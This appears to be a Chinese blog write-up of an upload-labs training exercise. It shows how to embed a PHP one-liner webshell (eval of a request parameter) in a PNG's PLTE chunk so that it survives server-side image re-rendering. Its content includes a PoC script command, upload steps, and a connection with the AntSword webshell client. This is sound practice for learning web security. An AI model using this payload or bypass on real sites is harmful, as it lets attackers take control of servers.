upload-labs二次渲染之png写入PLTE 数据块
2021-12-16 10:24:55

前言

今天打了一天的文件上传靶场，二次渲染的时候发现了一个小问题，这里来记录一下~有不对的地方请大佬指出

PNG需要将数据写入到 PLTE 数据块 或者 IDAT 数据块。这里只说前者。其实挺简单的，就是像素大小问题导致的图片PLTE数据块的不同，由于那啥我太菜，图片的存储块的保存原理不懂，这里就只说操作了。

环境

使用upload-labs(环境直接用buuoj.cn靶场平台就可以)或者国光师傅的docker镜像都可以，这里用的国光师傅的，搭建和复现参考
https://www.sqlsec.com/2020/10/upload.html
DockerHub 项目地址：https://hub.docker.com/r/sqlsec/ggctf-upload

# 进入项目文件夹
cd upload-labs-docker

# 一键部署运行
docker-compose up -d


启动成功之后访问30011端口就是二次渲染的靶场，结合文件包含来getshell

操作

首先准备一个 PNG 图片，建议像素调整为24*24（经过我几次测试，像素24X24成功了，大点的的试了一次没成）~

渲染前后对比一下，发现除了 PNG 文件头，其他部分都不一致：

写入 PLTE 数据块

写入 PLTE 数据块并不是对所有的 PNG 图片都是可行的，只有索引图像才可以成功插入 payload

修改索引图像插入 PHP 代码的脚本

https://github.com/hxer/imagecreatefrom-/blob/master/png/poc/poc_png.py


先对png图片进行修改，在 PS 里面将图片模式修改为索引颜色
注意注意重点！！！！！这里要用二次渲染之后的图片进行操作，意思就是把上一步改好像素的图片上传，下载渲染之后的图片来用

然后使用 Python2 运行脚本：

python poc_png.py -p '<?php eval($_REQUEST[1]);?>' -o ch4nge_1.png 2s.png


生成新的ch4nge_1.png图片如下：

这个图片是带 payload 的：

然后把ch4nge_1.png上传到目标网站上面渲染一下再导出：

再看一下我们的 payload 还在！成功！

蚁剑连接成功

把图片渲染马子拿到upload-labs这个靶场试了下也成功了！
